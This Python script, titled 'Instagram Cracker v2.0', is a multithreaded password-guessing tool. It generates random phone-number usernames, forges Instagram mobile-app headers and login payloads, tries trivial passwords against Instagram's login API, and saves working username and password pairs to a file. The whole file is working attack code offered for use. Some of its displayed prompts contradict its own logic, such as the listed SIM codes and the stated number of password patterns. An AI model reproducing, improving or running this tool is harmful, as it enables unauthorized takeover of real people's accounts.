#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""

import random
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*60}")

def generate_device_hash(uid, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
    hex_digest = hash_obj.hexdigest()
    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
    return hash_obj.hexdigest()

def create_instagram_headers(device_hash):
    """Create comprehensive Instagram API headers"""
    current_time = time.time()
    return {
        'host': 'i.instagram.com',
        'x-ig-app-locale': 'en_US',
        'x-ig-device-locale': 'en_US',
        'x-ig-mapped-locale': 'en_US',
        'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-3',
        'x-pigeon-rawclienttime': f'{current_time:.3f}',
        'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
        'x-ig-www-claim': '0',
        'x-bloks-is-prism-enabled': 'false',
        'x-bloks-is-layout-rtl': 'false',
        'x-ig-device-id': str(uuid.uuid4()),
        'x-ig-family-device-id': str(uuid.uuid4()),
        'x-ig-android-id': f'android-{device_hash[:16]}',
        'x-fb-connection-type': 'MOBILE.LTE',
        'x-ig-connection-type': 'MOBILE(LTE)',
        'x-ig-capabilities': '3brTv10=',
        'priority': 'u=3',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
        'accept-language': 'en-US, en;q=0.9',
        'x-mid': '',
        'ig-intended-user-id': '0',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-fb-http-engine': 'Liger',
        'x-fb-client-ip': 'True',
        'x-fb-server-cluster': 'True',
        'x-ig-bandwidth-speed-kbps': str(random.randint(200, 500)),
        'x-ig-bandwidth-totalbytes-b': str(random.randint(800000, 1500000)),
        'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 8000)),
        'x-ig-app-id': '3419628305025917',
        'x-pigeon-rawclienttime': str(round(current_time, 3)),
        'connection': 'keep-alive'
    }

def create_login_payload(uid, pw, device_hash):
    """Create encoded login payload for Instagram API"""
    timestamp = int(time.time())
    
    return (
        f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{device_hash[:16]}%22%2C'
        f'%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C'
        f'%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A'
        f'{timestamp}%3A{pw}%22%2C%22family_device_id%22%3A%22{uuid.uuid4()}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C'
        f'%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C'
        f'%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{uid}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C'
        f'%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{device_hash[:16]}%22%2C'
        f'%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{uuid.uuid4()}%22%2C'
        f'%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C'
        f'%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{uuid.uuid4()}%22%2C'
        f'%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C'
        f'%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D'
        f'&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D'
        f'&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
    )

def save_success(uid, pw):
    """Thread-safe function to save successful login"""
    try:
        # Try SD card path first
        output_dir = "/sdcard/XYZ"
        fallback_dir = "XYZ"
        
        try:
            os.makedirs(output_dir, exist_ok=True)
            filepath = os.path.join(output_dir, "RANDOM_OK.txt")
        except (OSError, PermissionError):
            # Fallback to local directory
            os.makedirs(fallback_dir, exist_ok=True)
            filepath = os.path.join(fallback_dir, "RANDOM_OK.txt")
        
        with open(filepath, "a", encoding='utf-8') as f:
            f.write(f"{uid}|{pw}\n")
        
        # Thread-safe add to success list
        with success_lock:
            oks.append(uid)
            
    except Exception as e:
        print(f"\r\033[1;91m[Save Error] Failed to save result: {e}")

def crack(uid, password_list, total_count):
    """Enhanced Instagram account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop
        loop += 1
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress}/{total_count} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m] ")
            sys.stdout.flush()
            
            # Create session and generate device hash
            session = requests.Session()
            device_hash = generate_device_hash(uid, pw)
            headers = create_instagram_headers(device_hash)
            payload = create_login_payload(uid, pw, device_hash)
            
            # Update headers with content length and cookies
            headers.update({
                'content-length': str(len(payload)),
                'cookie': ";".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
            })
            
            # Make API request
            response = session.post(
                'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',
                data=payload,
                headers=headers,
                timeout=30,
                allow_redirects=True
            )
            
            # Check response
            if 'logged_in_user' in response.text:
                print(f"\r\033[1;92m [‚úì SUCCESS] {uid} | {pw}")
                save_success(uid, pw)
                return True
            elif 'challenge_required' in response.text:
                print(f"\r\033[1;93m [‚ö† CHALLENGE] {uid} | {pw}")
                continue
            elif 'checkpoint_required' in response.text:
                print(f"\r\033[1;93m [‚ö† CHECKPOINT] {uid} | {pw}")
                continue
            else:
                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                continue
                
    except requests.exceptions.Timeout:
        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
        return False
    except KeyboardInterrupt:
        print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception as e:
        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
        return False
    
    return False

def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        '57273200',  # Static common password
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*60}")
    print(f"\033[1;96m     üéØ INSTAGRAM RANDOM NUMBER CLONING üéØ")
    print(f"\033[1;96m{'='*60}")
    print(f" \033[1;97m[\033[1;92m‚Ä¢\033[1;97m] Available Codes: \033[1;92m0310, 0320, 0330, 0340")
    print(f" \033[1;97m[\033[1;92m‚Ä¢\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    
    # Validate code
    valid_codes = ['7679', '7872', '9883', '8017']
    if code not in valid_codes:
        print(f" \033[1;91m[!] Invalid code. Using default: 0310")
        code = '9883'
        time.sleep(2)
    
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 5000")
        limit = 5000
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*60}")
    print(f"\033[1;96m     üî• STARTING INSTAGRAM CLONING ATTACK üî•")
    print(f"\033[1;96m{'='*60}")
    print(f' \033[1;32m(‚úì) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f' \033[1;93m(‚ö°) \033[1;37mThread Workers: \033[1;32m30')
    print(f' \033[1;94m(üîê) \033[1;37mPassword Patterns: \033[1;32m10 per ID')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[‚Ä¢] \033[1;37mResults will be saved to: \033[1;32mXYZ/RANDOM_OK.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*60}")
    print(f" \033[1;92m[‚úì] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*60}")
    print(f" \033[1;97m[üìä] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[‚úÖ] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[‚ùå] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[‚è±Ô∏è] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[üöÄ] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[üéâ] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[üòû] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*60}")
        print(f"\033[1;96m     üöÄ INSTAGRAM CRACKER v2.0 - ENHANCED üöÄ")
        print(f"\033[1;96m{'='*60}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] üéØ Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] üìä View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ‚ùå Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*60}")
            print(f"\033[1;96m     üìä PROGRAM STATISTICS üìä")
            print(f"\033[1;96m{'='*60}")
            print(f" \033[1;97m[‚úÖ] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[‚ùå] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[üìù] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[üîÑ] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*60}")
            print(f" \033[1;92m     üëã GOODBYE! THANKS FOR USING OUR TOOL! üëã")
            print(f"\033[1;92m{'='*60}")
            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
